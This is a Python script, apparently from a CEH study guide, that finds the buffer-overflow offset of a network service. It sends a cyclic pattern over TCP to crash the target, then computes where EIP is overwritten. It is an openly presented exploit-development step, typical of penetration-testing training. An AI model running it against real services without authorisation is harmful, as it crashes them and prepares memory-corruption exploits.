#!/usr/bin/env python3
"""
Buffer Overflow Offset Discovery Script
=======================================

This script uses a cyclic pattern to identify the exact offset
where the EIP register is overwritten in a buffer overflow.

Usage: python3 offset.py <target_ip> <target_port> [pattern_length]

Author: CEH Study Guide
Purpose: Educational - Buffer Overflow Offset Detection
"""

import sys
import socket
import argparse
import string

def create_cyclic_pattern(length):
    """
    Create a cyclic pattern for offset identification
    
    Args:
        length (int): Length of the pattern to generate
    
    Returns:
        str: Cyclic pattern string
    """
    alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits
    pattern = ""
    
    for a in alphabet:
        for b in alphabet:
            for c in alphabet:
                if len(pattern) < length:
                    pattern += a + b + c
                else:
                    return pattern[:length]
    
    return pattern[:length]

def find_offset(pattern, eip_value):
    """
    Find offset in cyclic pattern based on EIP value
    
    Args:
        pattern (str): Original cyclic pattern
        eip_value (str): EIP value in hex format (e.g., "316A4230")
    
    Returns:
        int: Offset position or -1 if not found
    """
    try:
        # Convert hex EIP to ASCII (little endian)
        eip_bytes = bytes.fromhex(eip_value)
        eip_ascii = eip_bytes[::-1].decode('latin-1')  # Reverse for little endian
        
        offset = pattern.find(eip_ascii)
        return offset
    except:
        return -1

def send_pattern_payload(target_ip, target_port, pattern, timeout=5):
    """
    Send cyclic pattern to target service
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port number
        pattern (str): Cyclic pattern to send
        timeout (int): Connection timeout
    
    Returns:
        bool: True if sent successfully
    """
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(timeout)
        conn.connect((target_ip, target_port))
        conn.send(pattern.encode('latin-1'))
        conn.close()
        return True
        
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="Buffer Overflow Offset Discovery Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send pattern and crash service
  python3 offset.py 192.168.1.100 9999 2000
  
  # Find offset from EIP value
  python3 offset.py --find-offset 316A4230 --pattern-length 2000
  
Steps:
  1. Run with target IP/port to send cyclic pattern
  2. Check debugger for EIP value (e.g., 316A4230)
  3. Use --find-offset with EIP value to get exact offset
        """
    )
    
    parser.add_argument('target_ip', nargs='?', help='Target IP address')
    parser.add_argument('target_port', nargs='?', type=int, help='Target port number')
    parser.add_argument('pattern_length', nargs='?', type=int, default=2000,
                       help='Length of cyclic pattern (default: 2000)')
    parser.add_argument('--find-offset', help='Find offset from EIP hex value')
    parser.add_argument('--pattern-length', type=int, default=2000,
                       help='Pattern length for offset calculation')
    parser.add_argument('--generate-pattern', type=int,
                       help='Generate cyclic pattern of specified length')
    
    args = parser.parse_args()
    
    # Generate pattern only
    if args.generate_pattern:
        pattern = create_cyclic_pattern(args.generate_pattern)
        print(f"[+] Generated cyclic pattern ({args.generate_pattern} bytes):")
        print(pattern)
        return
    
    # Find offset from EIP value
    if args.find_offset:
        pattern = create_cyclic_pattern(args.pattern_length)
        offset = find_offset(pattern, args.find_offset)
        
        if offset != -1:
            print(f"[+] EIP Offset found: {offset}")
            print(f"[+] EIP overwritten at position: {offset}")
            print(f"[+] Pattern before EIP: '{pattern[:offset]}'")
            print(f"[+] EIP value: '{pattern[offset:offset+4]}'")
        else:
            print(f"[-] Could not find offset for EIP value: {args.find_offset}")
            print(f"[-] Make sure the EIP value is correct and pattern length is sufficient")
        return
    
    # Send pattern to target
    if not args.target_ip or not args.target_port:
        parser.print_help()
        return
    
    pattern_length = args.pattern_length or 2000
    pattern = create_cyclic_pattern(pattern_length)
    
    print(f"[+] Generating cyclic pattern of {pattern_length} bytes")
    print(f"[+] Sending pattern to {args.target_ip}:{args.target_port}")
    print(f"[+] Pattern preview: {pattern[:100]}...")
    
    if send_pattern_payload(args.target_ip, args.target_port, pattern):
        print(f"[+] Pattern sent successfully!")
        print(f"[*] Check debugger for EIP value")
        print(f"[*] Then run: python3 {sys.argv[0]} --find-offset <EIP_HEX> --pattern-length {pattern_length}")
    else:
        print(f"[-] Failed to send pattern")

if __name__ == "__main__":
    main()

# Example EIP values and their offsets:
# EIP Address = 316A4230 (from original comment)
# Offset = 1052 (from original comment)